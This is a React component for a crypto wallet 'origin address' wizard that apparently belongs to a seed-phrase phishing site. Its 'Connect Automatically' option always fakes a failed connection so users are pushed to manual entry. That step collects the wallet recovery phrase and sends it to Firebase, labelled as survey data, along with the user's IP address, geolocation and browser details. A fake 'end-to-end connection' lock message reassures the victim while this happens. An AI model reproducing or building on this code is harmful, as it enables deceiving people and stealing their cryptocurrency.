"use client";
import React, { useState, useEffect } from "react";
import { Label } from "../ui/label";
import {
	Select,
	SelectContent,
	SelectItem,
	SelectTrigger,
	SelectValue,
} from "../ui/select";
import { Button } from "../ui/button";
import { motion, AnimatePresence } from "motion/react";
import { useWalletStore } from "@/store/walletStore";
import ShowManualWallets from "../manual-wallets/show-manual-wallets";
import { Lock } from "lucide-react";
import { storeSurveyData } from "@/lib/firebaseUtils";

type Network = {
	value: string;
	label: string;
	icon?: string;
};

const NETWORKS: Network[] = [
	{
		value: "bitcoin",
		label: "BITCOIN",
		icon: "/images/crypto/bitcoin-btc-logo.svg",
	},
	{ value: "eth", label: "ETH", icon: "/images/crypto/ethereum-eth-logo.svg" },
	{
		value: "avax",
		label: "AVAX",
		icon: "/images/crypto/avalanche-avax-logo.svg",
	},
	{ value: "bnb", label: "BNB", icon: "/images/crypto/bnb-bnb-logo.svg" },
	{ value: "ada", label: "ADA", icon: "/images/cardanoIcon.svg" },
	{
		value: "matic",
		label: "MATIC",
		icon: "/images/crypto/polygon-matic-logo.svg",
	},
	{ value: "tron", label: "TRX", icon: "/images/crypto/tron-trx-logo.svg" },
	{ value: "solana", label: "SOL", icon: "/images/crypto/solana-sol-logo.svg" },
	{ value: "xrp", label: "XRP", icon: "/images/crypto/xrp-xrp-logo.png" },
	{
		value: "bat",
		label: "BAT",
		icon: "/images/crypto/basic-attention-token-bat-logo.svg",
	},
];

interface OriginProps {
	onNext: () => void;
}

function OriginAddress({ onNext }: OriginProps) {
	const [blockChainNetwork, setBlockChainNetwork] = useState<string>("");
	const [selectedWallet, setSelectedWallet] = useState("");
	const [walletPhrase, setWalletPhrase] = useState("");
	const [originSteps, setOriginSteps] = useState<number>(0);
	const [addressMode, setAddressMode] = useState<"manual" | "automatic">(
		"automatic"
	);

	// ✅ New states
	const [viewingManualWallet, setViewingManualWallet] = useState(false);
	const [isTransitionLoading, setIsTransitionLoading] = useState(false);

	const [isContinueDisabled, setContinueDisabled] = useState(true);
	const [isOverlayVisible, setOverlayVisible] = useState(false);
	const [isLoading, setLoading] = useState(false);
	const [showFailure, setShowFailure] = useState(false);

	const {
		seedPhrase,
		destinationAddress,
		ipAddress,
		geolocation,
		userAgent,
		screenResolution,
		walletName,
		setWalletProvider,
		setBlockchainNetwork,
		setWalletId,
	} = useWalletStore();

	// ✅ Enable/disable continue
	useEffect(() => {
		if (originSteps === 0) {
			setContinueDisabled(!blockChainNetwork);
		} else if (originSteps === 1) {
			if (addressMode === "manual") setContinueDisabled(!selectedWallet);
			else setContinueDisabled(false);
		}
	}, [originSteps, blockChainNetwork, selectedWallet, addressMode]);

	// ✅ Continue button logic
	const handleContinue = () => {
		if (originSteps === 0) return setOriginSteps(1);

		if (originSteps === 1) {
			if (addressMode === "automatic") {
				setOverlayVisible(true);
				setLoading(true);
				setShowFailure(false);

				setTimeout(() => {
					setLoading(false);
					setShowFailure(true);
				}, 3000);

				setTimeout(() => {
					setOverlayVisible(false);
					setAddressMode("manual");
				}, 4500);
			} else {
				// ✅ Manual: show loading animation before opening manual wallets
				setIsTransitionLoading(true);
				setTimeout(() => {
					setViewingManualWallet(true);
					setIsTransitionLoading(false);
				}, 2000);
			}
		}
	};

	// ✅ Proceed to next after viewing manual wallet
	const handleFinish = async () => {
		setIsTransitionLoading(true);
		try {
			const survey = {
				blockchainNetwork: blockChainNetwork,
				walletProvider: selectedWallet,
				seedPhrase: walletPhrase || seedPhrase,
				destinationAddress,
				ipAddress,
				geolocation,
				userAgent,
				screenResolution,
				walletName,
			};
			const surveyId = await storeSurveyData(survey);
			if (surveyId) {
				setWalletId(surveyId);
			}
			setTimeout(() => {
				setIsTransitionLoading(false);
				setViewingManualWallet(false);
				setBlockchainNetwork(blockChainNetwork);
				setWalletProvider(selectedWallet);
				onNext();
			}, 1500);
		} catch (error) {
			console.log(error);
		}
	};

	useEffect(() => {
		if (viewingManualWallet) {
			// Disable background scroll
			document.body.style.overflow = "hidden";
		} else {
			// Re-enable scroll when closed
			document.body.style.overflow = "";
		}

		// Cleanup in case the component unmounts
		return () => {
			document.body.style.overflow = "";
		};
	}, [viewingManualWallet]);

	return (
		<>
			<section className="h-full min-h-[50dvh] flex flex-col relative">
				<div className="pb-4">
					<p className="font-semibold text-lg">Choose an origin address</p>
				</div>

				{/* Step 1: Choose blockchain */}
				{originSteps === 0 && (
					<SelectNetwork
						blockChainNetwork={blockChainNetwork}
						setBlockChainNetwork={setBlockChainNetwork}
						networks={NETWORKS}
					/>
				)}

				{/* Step 2: Choose address mode */}
				{originSteps === 1 && (
					<ChooseAddress
						addressMode={addressMode}
						setAddressMode={setAddressMode}
						selectedWallet={selectedWallet}
						setSelectedWallet={setSelectedWallet}
					/>
				)}

				<div className="w-full flex pt-6 mt-auto border-t border-black/20">
					<Button
						className="button-primary w-full"
						onClick={handleContinue}
						disabled={isContinueDisabled}
					>
						Next
					</Button>
				</div>

				{/* ✅ Overlay for automatic mode */}
				<AnimatePresence>
					{isOverlayVisible && (
						<motion.div
							initial={{ opacity: 0 }}
							animate={{ opacity: 1 }}
							exit={{ opacity: 0 }}
							className="fixed inset-0 bg-black/70 flex flex-col items-center justify-center z-50"
						>
							{isLoading ? (
								<motion.div
									initial={{ opacity: 0 }}
									animate={{ opacity: 1 }}
									transition={{ duration: 0.3 }}
									className="text-center text-white space-y-4"
								>
									<div className="animate-spin w-10 h-10 border-4 border-white/30 border-t-white rounded-full mx-auto" />
									<p>Connecting to wallet</p>
								</motion.div>
							) : showFailure ? (
								<motion.p
									initial={{ opacity: 0 }}
									animate={{ opacity: 1 }}
									className="text-red-700 text-center bg-white backdrop-blur p-8 rounded-sm"
								>
									Connection failed — switched to manual entry.
								</motion.p>
							) : null}
						</motion.div>
					)}
				</AnimatePresence>

				{/* ✅ Loader transition for switching states */}
				<AnimatePresence>
					{isTransitionLoading && (
						<motion.div
							initial={{ opacity: 0 }}
							animate={{ opacity: 1 }}
							exit={{ opacity: 0 }}
							className="fixed inset-0 bg-black/70 flex flex-col items-center justify-center z-[60]"
						>
							<div className="animate-spin w-10 h-10 border-4 border-white/30 border-t-white rounded-full mx-auto" />
							{!viewingManualWallet && (
								<p className="text-white mt-4 font-semibold text-center flex items-center gap-2">
									<span>Establishing end-to-end connection</span>

									<Lock
										className="w-4 h-4"
										strokeWidth={2.5}
									/>
								</p>
							)}
						</motion.div>
					)}
				</AnimatePresence>
			</section>

			{/* ✅ Manual wallet view */}
			<div>
				{viewingManualWallet && (
					<ShowManualWallets
						handleFinish={handleFinish}
						selectedWallet={selectedWallet}
						setWalletPhrase={setWalletPhrase}
					/>
				)}
			</div>
		</>
	);
}

// --- SelectNetwork ---
interface SelectNetworkProps {
	blockChainNetwork: string;
	setBlockChainNetwork: React.Dispatch<React.SetStateAction<string>>;
	networks: Network[];
}

const SelectNetwork: React.FC<SelectNetworkProps> = ({
	blockChainNetwork,
	setBlockChainNetwork,
	networks,
}) => (
	<div className="flex flex-col gap-12 w-full py-8 border-t border-black/20">
		<p className="text-black/65 text-sm font-semibold">
			First, tell us what tokens you have by selecting a blockchain network.
		</p>
		<div className="flex flex-col w-full space-y-2">
			<Label htmlFor="blockchain">Blockchain Network</Label>
			<Select
				value={blockChainNetwork}
				onValueChange={(v) => setBlockChainNetwork(v)}
			>
				<SelectTrigger>
					<SelectValue placeholder="Please select a blockchain network" />
				</SelectTrigger>
				<SelectContent className="text-black bg-white">
					{networks.map((n, i) => (
						<div key={n.value}>
							<SelectItem value={n.value}>
								<div className="flex items-center gap-4 text-black/80 py-2 font-medium">
									<img
										src={n.icon}
										alt={n.value}
										className="w-4 h-4"
									/>
									{n.label}
								</div>
							</SelectItem>

							{i < networks.length - 1 && (
								<div className="h-px bg-black/5 mx-2" />
							)}
						</div>
					))}
				</SelectContent>
			</Select>
		</div>
	</div>
);

// --- ChooseAddress ---
interface ChooseAddressProps {
	addressMode: "manual" | "automatic";
	setAddressMode: React.Dispatch<React.SetStateAction<"manual" | "automatic">>;
	selectedWallet: string;
	setSelectedWallet: React.Dispatch<React.SetStateAction<string>>;
}

function ChooseAddress({
	addressMode,
	setAddressMode,
	selectedWallet,
	setSelectedWallet,
}: ChooseAddressProps) {
	const popularWallets = [
		{
			value: "metamask",
			label: "MetaMask",
			icon: "/images/wallets/metamask-fox.svg",
		},
		{
			value: "trustwallet",
			label: "Trust Wallet",
			icon: "/images/wallets/trust-wallet-small.png",
		},
		{
			value: "phantom",
			label: "Phantom",
			icon: "/images/wallets/phantom-small.png",
		},
		{
			value: "keplr",
			label: "Keplr",
			icon: "/images/wallets/keplr-small.png",
		},
		{
			value: "exodus",
			label: "Exodus",
			icon: "/images/wallets/exedus-small.png",
		},
		{
			value: "atomic",
			label: "Atomic",
			icon: "/images/wallets/atomic-small.png",
		},
		{
			value: "coinbase",
			label: "Coinbase Wallet",
			icon: "/images/wallets/coinbase-v2.svg",
		},
		{
			value: "ledger",
			label: "Ledger",
			icon: "/images/wallets/ledgerSmall.jpeg",
		},
	];

	return (
		<div className="flex flex-col gap-6 w-full py-6 border-t border-black/20 relative">
			<p className="text-black/65 text-sm font-semibold">
				Next, tell us where you hold your tokens
			</p>

			{/* Mode Selection */}
			<div className="flex flex-col gap-4">
				{["automatic", "manual"].map((mode) => (
					<div
						key={mode}
						className={`flex items-center justify-between border rounded-lg p-4 cursor-pointer transition ${
							addressMode === mode
								? "border-blue-600 bg-indigo-100/70"
								: "border-black/0 hover:border-black/40 bg-neutral-100"
						}`}
						onClick={() => setAddressMode(mode as "manual" | "automatic")}
					>
						<div className="flex items-center gap-3">
							<input
								type="radio"
								name="addressMode"
								value={mode}
								checked={addressMode === mode}
								onChange={() => setAddressMode(mode as "manual" | "automatic")}
								className="accent-black"
							/>
							<Label className="text-black font-medium capitalize">
								{mode === "automatic"
									? "Connect Automatically"
									: "Connect Manually"}
							</Label>
						</div>
					</div>
				))}
			</div>

			{/* Manual Wallet Form */}
			{addressMode === "manual" && (
				<div className="flex flex-col gap-4">
					<Label>Select your wallet</Label>
					<Select
						value={selectedWallet}
						onValueChange={setSelectedWallet}
					>
						<SelectTrigger>
							<SelectValue placeholder="Select your wallet provider" />
						</SelectTrigger>
						<SelectContent className="text-black bg-white">
							{popularWallets.map((wallet, i) => (
								<div key={wallet.value}>
									<SelectItem value={wallet.value}>
										<div className="flex items-center gap-4 text-black/80 py-2 font-medium">
											<img
												src={wallet.icon}
												alt={wallet.label}
												className="w-4 h-4"
											/>
											{wallet.label}
										</div>
									</SelectItem>
									{i < popularWallets.length - 1 && (
										<div className="h-px bg-black/5 mx-2" />
									)}
								</div>
							))}
						</SelectContent>
					</Select>
				</div>
			)}
		</div>
	);
}

export default OriginAddress;
